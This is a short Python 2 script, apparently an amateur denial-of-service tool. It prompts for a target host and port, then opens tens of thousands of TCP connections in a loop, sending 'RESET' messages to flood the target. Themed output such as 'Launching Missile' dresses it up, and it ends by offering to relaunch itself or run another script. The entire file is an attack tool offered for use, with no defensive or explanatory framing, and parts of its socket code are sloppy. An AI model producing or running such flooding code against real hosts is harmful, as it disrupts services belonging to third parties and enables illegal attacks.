#!/usr/bin/python
import time
import socket
import os
import sys
import string
def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()
print ("\033[1;91minput target \033[1;95m[ex : www.example.ltd ]")
host=raw_input( "\033[1;96mTarget: " )
print ("\033[1;91minput port \033[1;95m[ex : 3128 ]")
port=input("\033[1;96mPORT: ")
connect=50000
ip = socket.gethostbyname( host )
print ( "\033[1;91m Target \033[1;93m[" + host + "] Locked" )
print ( "\033[1;91m Launching Missile to \033[1;93m["+ ip + "]" )
message=("RESET")
print ("\033[1;91mAssigning Target Position..........................")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("\033[1;91m Can't attack [" + ip + "] for tis moment")
    print ( "\033[1;92m Sending Missile to [" + ip + "]")
    ddos.close()
for i in range(1, connect):
    dos()
print("missile launcher to hot!")
if __name__ == "__main__":
    answer = raw_input("are you want to switch launcher? type Y to continue...")
    if answer.strip() in "y Y login LOGIN Login".split():
        restart_program()
    else:
        os.system(curdir+"Deqmain.py")
